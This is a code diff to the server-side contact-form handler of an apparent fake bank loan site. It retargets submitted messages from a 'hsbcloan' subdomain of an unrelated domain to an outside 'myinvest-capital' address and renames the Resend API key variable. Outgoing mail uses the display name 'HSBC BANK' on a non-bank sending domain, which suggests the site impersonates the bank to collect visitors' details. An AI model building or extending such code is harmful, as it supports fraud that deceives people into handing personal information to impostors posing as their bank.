@@ -11,7 +11,7 @@ const ContactInput = z.object({
   website: z.string().max(0).optional().or(z.literal("")),
 });
 
-const TO_EMAIL = "no-reply@hsbcloan.zenvoriax.com";
+const TO_EMAIL = "info@myinvest-capital.com";
 const FROM_EMAIL = "HSBC BANK <onboarding@resend.dev>";
 
 export const submitContactMessage = createServerFn({ method: "POST" })
@@ -33,11 +33,11 @@ export const submitContactMessage = createServerFn({ method: "POST" })
 
     if (error) throw new Error(error.message);
 
-    // 2) Try to deliver via Resend (connector or RESEND_API_KEY env). Soft-fail.
+    // 2) Try to deliver via Resend (connector or RESEND_API_KEY_2 env). Soft-fail.
     let emailSent = false;
-    const RESEND_API_KEY = process.env.RESEND_API_KEY;
+    const RESEND_API_KEY_2 = process.env.RESEND_API_KEY_2;
     const LOVABLE_API_KEY = process.env.LOVABLE_API_KEY;
-    if (RESEND_API_KEY && LOVABLE_API_KEY) {
+    if (RESEND_API_KEY_2 && LOVABLE_API_KEY) {
       try {
         const html = `
           <div style="font-family:Arial,sans-serif;max-width:600px;margin:auto">
@@ -55,7 +55,7 @@ export const submitContactMessage = createServerFn({ method: "POST" })
           headers: {
             "Content-Type": "application/json",
             Authorization: `Bearer ${LOVABLE_API_KEY}`,
-            "X-Connection-Api-Key": RESEND_API_KEY,
+            "X-Connection-Api-Key": RESEND_API_KEY_2,
           },
           body: JSON.stringify({
             from: FROM_EMAIL,
